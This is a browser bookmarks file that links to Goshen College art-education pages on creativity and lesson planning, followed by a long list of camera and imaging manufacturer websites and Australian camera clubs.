<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/MB_bio.htm" ADD_DATE="1106633735" LAST_CHARSET="ISO-8859-1" ID="35783820"><font size="+1">biographical information</font></A>
<DT><A HREF="http://www.goshen.edu/" ADD_DATE="1152024537" LAST_CHARSET="ISO-8859-1" ID="77944446">Goshen College</A>
<DT><A HREF="http://www.goshen.edu/art/" ADD_DATE="1145810142" LAST_CHARSET="ISO-8859-1" ID="36993584">Art Department</A>
<DT><A HREF="http://www.goshen.edu/art/ed/BIBLI2.html" ADD_DATE="1131677442" LAST_CHARSET="ISO-8859-1" ID="4317537">Many authors</A>
<DT><A HREF="http://www.artlex.com/" ADD_DATE="1135874575" LAST_CHARSET="ISO-8859-1" ID="92069586">http://www.artlex.com</A>
<DT><A HREF="http://www.benedict.com/info/fairuse/fairuse.asp" ADD_DATE="1135450528" LAST_CHARSET="ISO-8859-1" ID="37655058">listing</A>
<DT><A HREF="http://www.goshen.edu/art/ed/images.html" ADD_DATE="1127820991" LAST_CHARSET="ISO-8859-1" ID="89005466">instructions</A>

<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/rabbit.html" ADD_DATE="1137111734" LAST_CHARSET="ISO-8859-1" ID="46157157">Drawing
    Lesson</A>
<DT><A HREF="http://www.goshen.edu/art/ed/creativitylinks.html" ADD_DATE="1147445087" LAST_CHARSET="ISO-8859-1" ID="68115993">Links about <font size="+2">C</font>reativity</A>
<DT><A HREF="http://www.goshen.edu/art/ed/creativitykillers.html" ADD_DATE="1115693713" LAST_CHARSET="ISO-8859-1" ID="53579057">Classroom
    Creativity
    Killer</A>
<DT><A HREF="file:///D:/Web%20Pages/Art%20Ed/art-ed-links.html#other" ADD_DATE="1139435996" LAST_CHARSET="ISO-8859-1" ID="41373368">Art
    Education
    Sites</A>
<DT><A HREF="http://www.oilpainting.net.cn/" ADD_DATE="1106785863" LAST_CHARSET="ISO-8859-1" ID="69124359">Oil Paintings China</A>
<DT><A HREF="http://www.oilpainting.net.cn/artresources/oilpainting_resources5.html" ADD_DATE="1118553673" LAST_CHARSET="ISO-8859-1" ID="2326740">art education links</A>
<DT><A HREF="http://www.oilpainting.net.cn/artresources/oilpainting_resources7.html" ADD_DATE="1145964025" LAST_CHARSET="ISO-8859-1" ID="10267293">art for children</A>
<DT><A HREF="file:///D:/Web%20Pages/Art%20Ed/art-ed-links.html#mistakes" ADD_DATE="1113572887" LAST_CHARSET="ISO-8859-1" ID="59236117">Learning
from Mistakes</A>

<DT><A HREF="http://communities.msn.co.nz/ArtofSite/_whatsnew.msnw" ADD_DATE="1111810657" LAST_CHARSET="ISO-8859-1" ID="33395908">New
Zealand
Art Teacher Resource</A>
<DT><A HREF="http://www.princetonol.com/groups/iad/lessons/middle/vietnam.htm" ADD_DATE="1157253146" LAST_CHARSET="ISO-8859-1" ID="5868617">Art About Peace
  and
  the Vietnam Memorial</A>
<DT><A HREF="http://www.princetonol.com/groups/iad/lessons/middle/" ADD_DATE="1106878036" LAST_CHARSET="ISO-8859-1" ID="71031563">many great teaching
      ideas</A>
<DT><A HREF="http://www.artsednet.getty.edu/" ADD_DATE="1125854188" LAST_CHARSET="ISO-8859-1" ID="63875735">The Getty Center</A>
<DT><A HREF="http://www.goshen.edu/art/ed/westv.html" ADD_DATE="1145411302" LAST_CHARSET="ISO-8859-1" ID="2369564">Learning to Learn How
to
Draw</A>
<DT><A HREF="http://www.goshen.edu/art/ed/honey.html" ADD_DATE="1133730227" LAST_CHARSET="ISO-8859-1" ID="34152066">Honeyville School,
Topeka
IN</A>
<DT><A HREF="http://www.goshen.edu/art/ed/westv.html" ADD_DATE="1124145965" LAST_CHARSET="ISO-8859-1" ID="2074637">Westview Elementary,
Topeka,
IN&nbsp;</A>
<DT><A HREF="http://www.goshen.edu/art/ed/short.html" ADD_DATE="1113991977" LAST_CHARSET="ISO-8859-1" ID="1587064">methods and philosophy</A>
<DT><A HREF="http://www.goshen.edu/art/ed/create.html" ADD_DATE="1129086684" LAST_CHARSET="ISO-8859-1" ID="1885013">Definitions and
thoughts
about creativity</A>

<DT><A HREF="http://www.iteachnet.org/%7Edavid/oct_30_2000_marvin_bartel_multiculturalart.html" ADD_DATE="1142012384" LAST_CHARSET="ISO-8859-1" ID="74216132">Creatively
Teaching Multicultural Art</A>
<DT><A HREF="http://members.iteachnet.com/webzine/article.php?story=20001029201827278" ADD_DATE="1133440514" LAST_CHARSET="ISO-8859-1" ID="35126402">International
Education Daily</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/arted/tc.html" ADD_DATE="1109436022" LAST_CHARSET="ISO-8859-1" ID="66651313">Teaching
Creativity</A>
<DT><A HREF="http://members.iteachnet.com/webzine/article.php?story=20001227195022809" ADD_DATE="1102610101" LAST_CHARSET="ISO-8859-1" ID="46324601">International
Education Daily</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/lessons/lessons.html" ADD_DATE="1141575932" LAST_CHARSET="ISO-8859-1" ID="80518007">Art
Lessons</A>
<DT><A HREF="http://www.goshen.edu/art/ed/sketch.html" ADD_DATE="1134119464" LAST_CHARSET="ISO-8859-1" ID="91439423">Sketchbook Evaluation
Form</A>
<DT><A HREF="#top" ADD_DATE="1123983127" LAST_CHARSET="ISO-8859-1" ID="76125971">top
of page</A>
<DT><A HREF="http://www.goshen.edu/art/ed/young.html" ADD_DATE="1115002013" LAST_CHARSET="ISO-8859-1" ID="34774064">Art Newsletter</A>
<DT><A HREF="http://www.goshen.edu/art/ed/ritual.html" ADD_DATE="1149411886" LAST_CHARSET="ISO-8859-1" ID="36175687">Art Rituals in the
Classroom</A>

<DT><A HREF="http://www.goshen.edu/art/ed/housetor.html" ADD_DATE="1103546131" LAST_CHARSET="ISO-8859-1" ID="24856790">Aesthetics and
Ethics
in Everyday Life</A>
<DT><A HREF="http://www.goshen.edu/art/ed/ss-let1.html" ADD_DATE="1100082099" LAST_CHARSET="ISO-8859-1" ID="81154729">Art in Sunday
School&nbsp;</A>
<DT><A HREF="http://www.goshen.edu/art/ed/artlsn.html" ADD_DATE="1116441408" LAST_CHARSET="ISO-8859-1" ID="55996744">How to Plan Art Lessons</A>
<DT><A HREF="http://www.artsednet.getty.edu/ArtsEdNet/hm/Jan96/0069.html" ADD_DATE="1109265834" LAST_CHARSET="ISO-8859-1" ID="67250977">Helping
parents</A>
<DT><A HREF="http://www.artsednet.getty.edu/ArtsEdNet/hm/Jan96/0069.html" ADD_DATE="1135010115" LAST_CHARSET="ISO-8859-1" ID="38464328">learn
to care</A>
<DT><A HREF="http://www.d.umn.edu/lib/handouts/wa.html" ADD_DATE="1141491645" LAST_CHARSET="ISO-8859-1" ID="6303177"> Artists</A>
<DT><A HREF="http://home.att.net/%7Ecpwiggins/librarianship/women_sculptors/" ADD_DATE="1124341447" LAST_CHARSET="ISO-8859-1" ID="38541100">Women
sculptors:</A>
<DT><A HREF="http://www.goshen.edu/art/ed/quest4o.htm" ADD_DATE="1148523768" LAST_CHARSET="ISO-8859-1" ID="95813412">Sources of Inspiration
for
works of art</A>

<DT><A HREF="http://www.awc.cc.az.us/psy/dgershaw/lol/MistakesLearn.html" ADD_DATE="1144398980" LAST_CHARSET="ISO-8859-1" ID="96108811">Learning
from Mistakes</A>
<DT><A HREF="http://www.games2train.com/site/html/theory.html#question" ADD_DATE="1137654908" LAST_CHARSET="ISO-8859-1" ID="77918265">Questions,
mistakes, and involvement of multiple senses</A>
<DT><A HREF="http://www.games2train.com/site/html/theory.html#question" ADD_DATE="1125596057" LAST_CHARSET="ISO-8859-1" ID="31442780">http://www.games2train.com/site/html/theory.html#question</A>
<DT><A HREF="http://www.parentsplace.com/expert/parenting/articles/0,10335,243319_113887,00.html" ADD_DATE="1135229779" LAST_CHARSET="ISO-8859-1" ID="99025307">Learning
from your mistakes</A>
<DT><A HREF="http://www.uic.edu/classes/ad/ad382/index.html" ADD_DATE="1113826229" LAST_CHARSET="ISO-8859-1" ID="98190399">University of
Illinois
at Chicago</A>
<DT><A HREF="http://www.uic.edu/classes/ad/ad382/sites/AEA/AEA_01/AAEA01b.html" ADD_DATE="1145292213" LAST_CHARSET="ISO-8859-1" ID="47717535">"Investigating
the Culture of Curriculum"</A>
<DT><A HREF="http://www.engines4ed.org/hyperbook/nodes/NODE-283-pg.html" ADD_DATE="1119895750" LAST_CHARSET="ISO-8859-1" ID="57145867">The
Ten
Top
Mistakes in Education</A>
<DT><A HREF="http://www.engines4ed.org/hyperbook/nodes/educator-outline.html#NODE-283" ADD_DATE="1150554863" LAST_CHARSET="ISO-8859-1" ID="38770091">Table
of Contents</A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/grades.html" ADD_DATE="1149416744" LAST_CHARSET="ISO-8859-1" ID="83944644">How to Earn
Better
Test Grades</A>

<DT><A HREF="http://www.goshen.edu/art/ed/BIBLI2.html" ADD_DATE="1112045885" LAST_CHARSET="ISO-8859-1" ID="9229013">Readings</A>
<DT><A HREF="http://www.goshen.edu/art/ed/artlsn.html" ADD_DATE="1124095859" LAST_CHARSET="ISO-8859-1" ID="35231616">Planning the Parts of
Creative Art Lessons</A>
<DT><A HREF="http://www.goshen.edu/art/ed/teachem.htm" ADD_DATE="1146092098" LAST_CHARSET="ISO-8859-1" ID="98012771">Pass it
On - practice teaching what we learned</A>
<DT><A HREF="http://www.goshen.edu/art/ed/fieldtch.html" ADD_DATE="1144416102" LAST_CHARSET="ISO-8859-1" ID="45318032">One-on-one
Teaching Assignment</A>
<DT><A HREF="http://www.goshen.edu/art/ed/critique1.html" ADD_DATE="1102649344" LAST_CHARSET="ISO-8859-1" ID="14045286">Successful Art
Class Critique Sessions</A>
<DT><A HREF="http://www.goshen.edu/art/ed/rubric3.html" ADD_DATE="1150534342" LAST_CHARSET="ISO-8859-1" ID="84835259">DBEA Art Rubric&nbsp;</A>
<DT><A HREF="http://www.goshen.edu/art/ed/stdypg1.html" ADD_DATE="1105986080" LAST_CHARSET="ISO-8859-1" ID="57526636">Study Sheet for test 1</A>
<DT><A HREF="http://www.goshen.edu/art/ed/stdypg2.html" ADD_DATE="1148779474" LAST_CHARSET="ISO-8859-1" ID="72323425">Study
Sheet for test 2</A>
<DT><A HREF="http://www.goshen.edu/art/ed/answer.html" ADD_DATE="1121388974" LAST_CHARSET="ISO-8859-1" ID="23377483">An example essay answer</A>

<DT><A HREF="#top" ADD_DATE="1102318398" LAST_CHARSET="ISO-8859-1" ID="93881174">top
of page</A>
<DT><A HREF="http://bartelart.com/mb.html" ADD_DATE="1113537622" LAST_CHARSET="ISO-8859-1" ID="26648409"><span style="text-decoration: underline;">You are invited to Contact</span></A>
<DT><A HREF="http://www.goshen.edu/%7Emarvinpb/MB_bio.htm" ADD_DATE="1155478231" LAST_CHARSET="ISO-8859-1" ID="97554068">Author's biography</A>
<DT><A HREF="#top" ADD_DATE="1144819442" LAST_CHARSET="ISO-8859-1" ID="25036036">top
of page</A>
<DT><A HREF="http://www.goshen.edu/" ADD_DATE="1132980505" LAST_CHARSET="ISO-8859-1" ID="58259167">Goshen
  College</A>
<DT><A HREF="http://www.adeal.com.au/" ADD_DATE="1110499271" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Adeal</A>
<DT><A HREF="http://www.adobe.com" ADD_DATE="1153821743" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Adobe</A>
<DT><A HREF="http://www.agfa.com/" ADD_DATE="1112434636" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Agfa
                  </A>
<DT><A HREF="http://www.agfaphoto.com" ADD_DATE="1154685475" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Agfa
                  Photo</A>
<DT><A HREF="http://www.agfa.co.uk/" ADD_DATE="1153039162" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Agfa
                  (UK)</A>
<DT><A HREF="http://www.aiptek.com.tw/index.htm" ADD_DATE="1158052465" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Aiptek</A>
<DT><A HREF="http://www.apple.com" ADD_DATE="1107592439" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Apple</A>
<DT><A HREF="http://www.arguscamera.com" ADD_DATE="1159688772" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Argus</A>

<DT><A HREF="http://www.bushnell.com/productinfo/binoculars/elite.html" ADD_DATE="1111760570" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Bausch
                  &amp; Lomb</A>
<DT><A HREF="http://www.basf.com" ADD_DATE="1158773179" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">BASF</A>
<DT><A HREF="http://beseler-photo.com" ADD_DATE="1141267388" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Beseler</A>
<DT><A HREF="http://www.bpay.com.au" ADD_DATE="1148996521" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">BPay
                  </A>
<DT><A HREF="http://www.bronicaeurope.com/frameset.html" ADD_DATE="1151983957" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Bronica
                  Europe</A>
<DT><A HREF="http://www.tamron.com/" ADD_DATE="1115668844" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Bronica
                  / Tamron</A>
<DT><A HREF="http://www.bushnell.com" ADD_DATE="1134851799" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Bushnell
                  Sports Optics</A>
<DT><A HREF="http://www.canon.com.au/" ADD_DATE="1124773727" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Canon
                  (Australia)</A>

<DT><A HREF="http://www.canopus.com" ADD_DATE="1121177592" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Canopus
                  (Australia)</A>
<DT><A HREF="http://world.casio.com/pacific/" ADD_DATE="1113910010" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Casio
                  (Global) </A>
<DT><A HREF="http://casio.com" ADD_DATE="1101232390" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Casio
                  (USA) </A>
<DT><A HREF="http://www.cokin.fr/" ADD_DATE="1160122205" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Cokin
                  Filters</A>
<DT><A HREF="http://www.contaxcameras.com" ADD_DATE="1103409798" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Contax
                  / Yashica</A>
<DT><A HREF="http://www.corel.com" ADD_DATE="1112486275" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Corel</A>
<DT><A HREF="http://www.pentax.com.au/" ADD_DATE="1101868964" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">C.R.
                  Kennedy </A>
<DT><A HREF="http://www.dycam.com" ADD_DATE="1104746055" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Dycam</A>
<DT><A HREF="http://www.epson.com.au/" ADD_DATE="1100713759" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Epson
                  (Australia)</A>

<DT><A HREF="http://www.fujifilm.com/JSP/fuji/epartners/HomePage.jsp" ADD_DATE="1143662669" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Fujifilm
                  Home</A>
<DT><A HREF="http://www.hanimex.com.au/Default.asp" ADD_DATE="1127507257" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Fuji
                  / Hanimex</A>
<DT><A HREF="http://www.fujihunt.com" ADD_DATE="1123828926" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Fuji
                  Hunt Chemicals </A>
<DT><A HREF="http://www.fujifilm.co.uk/index.php?flash=6" ADD_DATE="1156945816" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Fuji
                  (UK)</A>
<DT><A HREF="http://www.hasselblad.se" ADD_DATE="1114362157" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Hasselblad</A>
<DT><A HREF="http://www.hama.co.uk" ADD_DATE="1120074110" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Hama</A>
<DT><A HREF="http://www.hp.com" ADD_DATE="1107193944" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Hewlett
                  Packard</A>
<DT><A HREF="http://www.hitachi.com/" ADD_DATE="1107932757" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Hitachi
                  (USA) </A>
<DT><A HREF="http://www.hitachi.us/tv/index_flash.shtml" ADD_DATE="1132457603" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Hitachi
                  Electronics</A>

<DT><A HREF="http://www.iomega.com" ADD_DATE="1101628276" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Iomega</A>
<DT><A HREF="http://www.ilford.com" ADD_DATE="1100720776" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ilford
                  Photo</A>
<DT><A HREF="http://www.jenimage.com/index.php?id=98&type=0" ADD_DATE="1130258925" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Jenoptic</A>
<DT><A HREF="http://www.jvc-australia.com/_home.asp" ADD_DATE="1109169572" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">JVC
                  (Australia) </A>
<DT><A HREF="http://www.jvcpro-australia.com/JVCPRO/jsp/c_index.jsp" ADD_DATE="1100158404" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">JVC
                  Pro</A>
<DT><A HREF="http://www.kodak.com/" ADD_DATE="1141968352" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kodak</A>
<DT><A HREF="http://www.kyocera.com" ADD_DATE="1107691608" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Kyocera
                  - Contax / Yashica</A>
<DT><A HREF="http://www.leica-camera.com/index_e.html" ADD_DATE="1141374650" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Leica
                  </A>
<DT><A HREF="http://www.lge.com.au/" ADD_DATE="1130713730" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">LG
                  Electronics</A>

<DT><A HREF="http://www.lowepro.com" ADD_DATE="1159624422" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Lowepro</A>
<DT><A HREF="http://www.lumiquest.com" ADD_DATE="1156992352" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Lumiquest</A>
<DT><A HREF="http://www.macromedia.com" ADD_DATE="1105314386" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Macromedia</A>
<DT><A HREF="http://www.mainstayoptical.com" ADD_DATE="1124147006" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mainstay
                  Optical</A>
<DT><A HREF="http://www.mamiya.com" ADD_DATE="1117918800" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Mamiya
                  (America)</A>
<DT><A HREF="http://www.manfrotto.com/" ADD_DATE="1119173254" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Manfrotto</A>
<DT><A HREF="http://www.matrox.com/" ADD_DATE="1125328254" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Matrox</A>
<DT><A HREF="http://www.maxwell.com.au/" ADD_DATE="1117789862" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Maxwells/
                  Nikon</A>
<DT><A HREF="http://www.microsoft.com" ADD_DATE="1122531909" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Microsoft</A>

<DT><A HREF="http://www.microtek.com/" ADD_DATE="1137763386" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Microtek</A>
<DT><A HREF="http://www.militaryandlaw.com.au" ADD_DATE="1119607683" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Military
                  &amp; Law Enforcement Technologies</A>
<DT><A HREF="http://www.minox.com" ADD_DATE="1127226822" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Minox</A>
<DT><A HREF="http://www.newmagic.com.au/" ADD_DATE="1138426002" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">New
                  Magic</A>
<DT><A HREF="http://www.maxwell.com.au" ADD_DATE="1103019209" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nikon
                  (Australia)</A>
<DT><A HREF="http://www.klt.co.jp/Nikon/" ADD_DATE="1154682936" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nikon
                  Corporation</A>
<DT><A HREF="http://nikonimaging.com/global/index.htm" ADD_DATE="1102003785" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nikon
                  Imaging</A>
<DT><A HREF="http://www.nikonusa.com/home.php" ADD_DATE="1159913882" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nikon
                  (USA)</A>

<DT><A HREF="http://www.olympus.com.au/" ADD_DATE="1108793950" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Olympus
                    (Australia)</A>
<DT><A HREF="http://cf.olympus-europa.com/consumer/digimg/disystem/disystem.cfm" ADD_DATE="1122026752" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Olympus
                  (Europe)</A>
<DT><A HREF="http://www.olympusamerica.com" ADD_DATE="1106856683" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Olympus
                  (USA)</A>
<DT><A HREF="http://www.pakon.com" ADD_DATE="1116675564" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pakon</A>
<DT><A HREF="http://www.panasonic.com.au/" ADD_DATE="1154433213" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Panasonic
                  (Australia) </A>
<DT><A HREF="http://www.panasonic.com" ADD_DATE="1108433816" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Panasonic
                  (USA) </A>
<DT><A HREF="http://www.crkennedy.com.au/pentax/default.html" ADD_DATE="1117345197" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pentax
                  (Australia)</A>
<DT><A HREF="http://www.pentaxusa.com/products/index.cfm?CFID=4673862&CFTOKEN=23674253" ADD_DATE="1124440994" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pentax
                  Products</A>
<DT><A HREF="http://www.pentax.co.uk/" ADD_DATE="1117552246" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pentax
                  (UK)</A>

<DT><A HREF="http://www.pentax.com/" ADD_DATE="1117452459" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Pentax
                  (Worldwide)</A>
<DT><A HREF="http://www.philips.com" ADD_DATE="1106158203" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Philips
                  Media Systems</A>
<DT><A HREF="http://www.polaroid.com/" ADD_DATE="1125192711" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Polaroid</A>
<DT><A HREF="http://www.scanace.com/en/product/product.php" ADD_DATE="1158775966" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Prime
                  Film Scanners</A>
<DT><A HREF="http://www.proscan.com.au/" ADD_DATE="1136820790" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Proscan
                  (Australia)</A>
<DT><A HREF="http://www.qtm.com/" ADD_DATE="1124565989" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Quantum
                  Instruments</A>
<DT><A HREF="http://www.ricoh.com.au/" ADD_DATE="1155517175" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ricoh
                  (Australia)</A>
<DT><A HREF="http://www.raynox.com/" ADD_DATE="1142084033" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Raynox</A>
<DT><A HREF="http://www.ricoh.com.au/" ADD_DATE="1148661853" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ricoh
                  (Australia)</A>

<DT><A HREF="http://www.ricohcpg.com/" ADD_DATE="1113184831" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ricoh
                  Corporation</A>
<DT><A HREF="http://www.ricoh-europe.com" ADD_DATE="1101006143" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ricoh
                  (Europe)</A>
<DT><A HREF="http://www.ricoh-cameras.co.uk/" ADD_DATE="1113738963" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ricoh
                  (UK)</A>
<DT><A HREF="http://ricoh-usa.com/" ADD_DATE="1130923550" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Ricoh
                  (USA)</A>
<DT><A HREF="http://www.samsung.com/au/" ADD_DATE="1123486910" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Samsung
                  (Australia) </A>
<DT><A HREF="http://www.samsungcamera.com/" ADD_DATE="1151451207" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Samsung
                  Camera</A>
<DT><A HREF="http://www.samsung.com/" ADD_DATE="1150480090" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Samsung
                  Digital</A>
<DT><A HREF="http://www.samsungcamerausa.com/Camera/index.asp" ADD_DATE="1150662589" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Samsung
                  (USA)</A>
<DT><A HREF="http://www.sekonic.com" ADD_DATE="1129626065" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sekonic</A>

<DT><A HREF="http://www.sigmaphoto.com/html/company.htm" ADD_DATE="1153448156" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sigma
                  Corporation</A>
<DT><A HREF="http://www.sharp.net.au/" ADD_DATE="1145094382" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sharp
                  (Australia)</A>
<DT><A HREF="http://www.sharp-usa.com/SharpHome/1,1959,,00.html" ADD_DATE="1131578708" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sharp
                  (USA)</A>
<DT><A HREF="http://www.sony.com.au/home.asp" ADD_DATE="1153110895" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sony
                  (Australia)</A>
<DT><A HREF="http://www.sony.com/" ADD_DATE="1153837189" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sony
                  (USA) </A>
<DT><A HREF="http://www.steiner.de%20" ADD_DATE="1153554317" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Steiner
                  Binoculars</A>
<DT><A HREF="http://www.sunpak.com" ADD_DATE="1159916436" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Sunpak</A>
<DT><A HREF="http://www.syquest.com" ADD_DATE="1110261609" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Syquest</A>
<DT><A HREF="http://www.tamron.com" ADD_DATE="1147736387" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tamron</A>

<DT><A HREF="http://www.tetenal.co.uk/" ADD_DATE="1108099108" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tetenal
                  Photo Paper</A>
<DT><A HREF="http://www.tenba.com" ADD_DATE="1127555664" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tenba</A>
<DT><A HREF="http://www.ti.com/" ADD_DATE="1111926237" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Texas
                  Instruments</A>
<DT><A HREF="http://www.tokina-usa.com/" ADD_DATE="1125600212" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Tokina
                  Industrial</A>
<DT><A HREF="http://www.ur1.com" ADD_DATE="1144956981" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">UR1</A>
<DT><A HREF="http://www.unomat-international.com/products/products_eng.php?PHPSESSID=9f90d839f2ba37ebf653d5ac98464174&display=grps" ADD_DATE="1118033297" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Unomat
                  International</A>
<DT><A HREF="http://www.velbon.com.au/" ADD_DATE="1150741780" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Velbon</A>
<DT><A HREF="http://www.yashica.com/site.html" ADD_DATE="1143481803" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Yashica
                  Cameras </A>
<DT><A HREF="http://www.mmm.com/" ADD_DATE="1154802944" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">3
                  M Commercial Division</A>

<DT><A HREF="http://www.f8.com" ADD_DATE="1115056626" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Focal
                  Point f/8</A>
<DT><A HREF="http://members.optushome.com.au/ausclubs/" ADD_DATE="1138747834" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Australian
                  Camera Clubs</A>
<DT><A HREF="http://www.melbournephoto.org.au/" ADD_DATE="1136635834" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Melbourne
                  Camera Club</A>
<DT><A HREF="http://www.melbournephoto.org.au/syllabus.html" ADD_DATE="1103467335" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">&gt;&gt;&gt;
                  Melbourne Camera Club's Syllabus</A>
<DT><A HREF="http://www.nikonclub.com.au/" ADD_DATE="1151881523" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Nikon
                  Club Australia</A>
<DT><A HREF="http://www.photoimaging.com.au" ADD_DATE="1137590835" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">Photographic
                  &amp; Imaging Council of Australia (PICA)</A>
